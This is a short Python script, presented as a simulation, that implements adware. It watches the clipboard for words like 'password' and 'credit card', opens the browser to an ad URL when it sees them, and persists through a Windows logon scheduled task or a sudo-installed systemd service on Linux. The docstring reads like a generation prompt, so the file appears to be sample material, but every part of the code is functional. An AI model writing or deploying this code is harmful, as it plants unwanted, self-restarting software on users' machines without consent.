import os
import sys
import time
import threading
import pyperclip
import webbrowser

def adware_clipboard_monitoring_redirect_ads(ad_url: str) -> None:
    """
    This function simulates an adware attack by performing the following:
    1. Monitoring the clipboard for specific keywords.
    2. Redirecting the browser to the specified ad URL when keywords are detected.
    3. Establishing persistence by creating a system service named 'AdwareService' on Windows or 'adware' on Linux.

    The adware should:
    - Monitor the clipboard for keywords like "password" or "credit card".
    - Redirect the browser to the specified ad URL when such keywords are detected.
    - Use system services for persistence with the specified service names.

    :param ad_url: The URL to redirect the browser to when keywords are detected.
    """
    keywords = ["password", "credit card"]
    
    def monitor_clipboard():
        last_clipboard_content = ""
        while True:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:
                for keyword in keywords:
                    if keyword in current_clipboard_content.lower():
                        webbrowser.open(ad_url)
                        break
                last_clipboard_content = current_clipboard_content
            time.sleep(1)

    def create_persistence():
        if os.name == 'nt':  # Windows
            service_name = 'AdwareService'
            service_command = f'schtasks /create /tn {service_name} /tr "{sys.executable} {os.path.abspath(__file__)}" /sc onlogon'
            os.system(service_command)
        else:  # Linux
            service_name = 'adware'
            service_command = f'echo "[Unit]\nDescription=Adware Service\n[Service]\nExecStart={sys.executable} {os.path.abspath(__file__)}\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/{service_name}.service > /dev/null && sudo systemctl enable {service_name}'
            os.system(service_command)

    create_persistence()
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    adware_clipboard_monitoring_redirect_ads("http://example.com/ad")
